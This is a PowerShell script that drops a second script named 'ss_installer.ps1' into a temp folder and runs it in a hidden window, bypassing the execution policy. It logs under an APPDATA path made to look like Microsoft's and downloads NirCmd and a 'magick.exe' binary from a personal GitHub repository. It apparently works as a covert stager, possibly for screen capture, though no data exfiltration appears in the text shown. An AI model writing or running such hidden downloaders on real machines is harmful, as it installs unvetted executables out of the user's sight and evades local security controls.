$installerContent = @'
$ErrorActionPreference = "Continue"

$logDir = "$env:APPDATA\Microsoft\run"
if (-not (Test-Path $logDir)) {
  New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}
$logFile = "$logDir\ss_installer.log"

function Log-Msg($msg) {
  $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg"
  Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
}

Log-Msg "[INFO] ss_installer started."

$NirCmdDir = "$env:TEMP\run\nircmd"
$NirCmdZip = "$env:TEMP\nircmd.zip"

if (!(Test-Path $NirCmdDir)) {
  $null = New-Item $NirCmdDir -ItemType Directory
}

if (-not (Test-Path "$NirCmdDir\nircmd.exe")) {
  $Url = "https://www.nirsoft.net/utils/nircmd.zip"
  try {
    Log-Msg "[INFO] Downloading NirCmd from $Url..."
    Invoke-WebRequest `
      -Uri $Url `
      -OutFile $NirCmdZip `
      -ErrorAction Stop
    Log-Msg "[INFO] NirCmd downloaded."
  }
  catch {
    Log-Msg "[ERROR] Failed downloading NirCmd: $($_.Exception.ToString())"
  }

  if (Test-Path $NirCmdZip) {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    try {
      Log-Msg "[INFO] Extracting NirCmd..."
      [System.IO.Compression.ZipFile]::ExtractToDirectory(
        $NirCmdZip,
        $NirCmdDir
      )
      Log-Msg "[INFO] NirCmd extracted."
    }
    catch {
      Log-Msg "[ERROR] Failed extracting NirCmd: $($_.Exception.ToString())"
    }

    if (Test-Path $NirCmdZip) {
      Remove-Item $NirCmdZip -Force
    }
  }
}
else {
  Log-Msg "[INFO] NirCmd already present."
}

$MagickDir = "$env:TEMP\run\magick"
if (!(Test-Path $MagickDir)) {
  $null = New-Item $MagickDir -ItemType Directory
}

if (-not (Test-Path "$MagickDir\magick.exe")) {
  $Url = "https://github.com/yuan-miranda/magick/raw/main/magick.exe"
  try {
    Log-Msg "[INFO] Downloading magick.exe from $Url..."
    Invoke-WebRequest `
      -Uri $Url `
      -OutFile "$MagickDir\magick.exe" `
      -ErrorAction Stop
    Log-Msg "[INFO] Downloaded magick.exe."
  }
  catch {
    Log-Msg "[ERROR] Failed downloading magick.exe: $($_.Exception.ToString())"
  }
}
else {
  Log-Msg "[INFO] magick.exe already present."
}

Log-Msg "[INFO] ss_installer finished successfully."
'@

if (!(Test-Path "$env:TEMP\run")) {
  $null = New-Item "$env:TEMP\run" -ItemType Directory
}

Set-Content `
  -Path "$env:TEMP\run\ss_installer.ps1" `
  -Value $installerContent `
  -Force

$self = Join-Path $env:TEMP "run\ss_installer.ps1"
if (Test-Path $self) {
  Start-Process powershell.exe `
    -ArgumentList @(
    '-NoProfile',
    '-ExecutionPolicy',
    'Bypass',
    '-File',
    $self
  ) -WindowStyle Hidden -Wait
}
